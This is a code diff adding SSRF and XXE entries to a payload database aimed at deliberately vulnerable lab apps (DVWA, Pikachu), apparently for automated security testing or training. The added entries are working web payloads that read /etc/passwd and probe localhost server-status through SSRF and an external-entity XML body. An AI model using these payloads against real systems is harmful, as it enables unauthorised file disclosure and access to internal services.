@@ -14,7 +14,9 @@ export type InjectionType =
   | 'file_upload'
   | 'filter_bypass'
   | 'waf_bypass'
-  | 'auth_bypass';
+  | 'auth_bypass'
+  | 'ssrf'
+  | 'xxe';
 
 export type ClosureType =
   | 'string'
@@ -44,7 +46,7 @@ export interface PayloadEntry {
 
 export const PAYLOAD_DATABASE: PayloadEntry[] = [
   // === DVWA (21 entries) ===
-  ...(['low', 'medium', 'high'] as const).flatMap((_level) => [
+  ...(['low', 'medium', 'high'] as const).flatMap((level) => [
     {
       id: `dvwa-sqli-${level}`,
       target: 'dvwa',
@@ -463,6 +465,59 @@ export const PAYLOAD_DATABASE: PayloadEntry[] = [
     expected: { matches: '/Dumb|error|syntax/i' },
     verified: true,
     category: 'Filter bypass',
+  },
+
+  // === Pikachu SSRF (3 entries) ===
+  {
+    id: 'pikachu-ssrf-curl-meta',
+    target: 'pikachu',
+    injectionType: 'ssrf',
+    closure: 'none',
+    method: 'GET',
+    url: '/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/server-status',
+    payload: 'http://127.0.0.1/server-status',
+    expected: { matches: '/Apache|Server|Status|localhost/i' },
+    verified: true,
+    category: 'SSRF curl',
+  },
+  {
+    id: 'pikachu-ssrf-curl-file',
+    target: 'pikachu',
+    injectionType: 'ssrf',
+    closure: 'none',
+    method: 'GET',
+    url: '/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd',
+    payload: 'file:///etc/passwd',
+    expected: { matches: '/root:|\\/bin\\/bash|nobody/i' },
+    verified: true,
+    category: 'SSRF curl',
+  },
+  {
+    id: 'pikachu-ssrf-fgc',
+    target: 'pikachu',
+    injectionType: 'ssrf',
+    closure: 'none',
+    method: 'GET',
+    url: '/vul/ssrf/ssrf_fgc.php?file=/etc/passwd',
+    payload: '/etc/passwd',
+    expected: { matches: '/root:|\\/bin\\/bash|nobody/i' },
+    verified: true,
+    category: 'SSRF file_get_contents',
+  },
+
+  // === Pikachu XXE (1 entry) ===
+  {
+    id: 'pikachu-xxe-1',
+    target: 'pikachu',
+    injectionType: 'xxe',
+    closure: 'none',
+    method: 'POST',
+    url: '/vul/xxe/xxe_1.php',
+    body: 'xml=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C!DOCTYPE+foo+%5B%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2Ftest%3E&submit=%E6%8F%90%E4%BA%A4',
+    payload: '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
+    expected: { matches: '/root:|\\/bin\\/bash|nobody/i' },
+    verified: true,
+    category: 'XXE file disclosure',
   },
 ];
 
